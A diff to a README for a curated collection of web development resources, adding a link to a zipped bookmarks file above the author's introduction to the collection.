@@ -6,6 +6,9 @@ A Curated Collection of WebDev Tools for Your Next Project
 Enhance Your Development Workflow with These Handpicked Resources
 =================================================================
 
+[bookmarks_14_11_2023_DHSTUDIO.html.zip](https://github.com/DavidHubber/Web-Development-Resources/files/13343750/bookmarks_14_11_2023_DHSTUDIO.html.zip)
+
+
 As a web development enthusiast with 15 years of experience, my journey in this realm has been driven by passion and curiosity, rather than professional pursuit. This path has been marked by a continuous exploration and learning, where each new tool or resource opens up a world of possibilities, many of which I am still discovering.
 
 Today, I'm excited to share with you a collection that is particularly close to my heart. It's a compilation of web development bookmarks, a comprehensive assortment of tools and resources that I've come across in my explorations. While I have not delved into each of these tools in depth, they represent a diverse range of solutions that have caught my interest and seem promising for various aspects of web development.
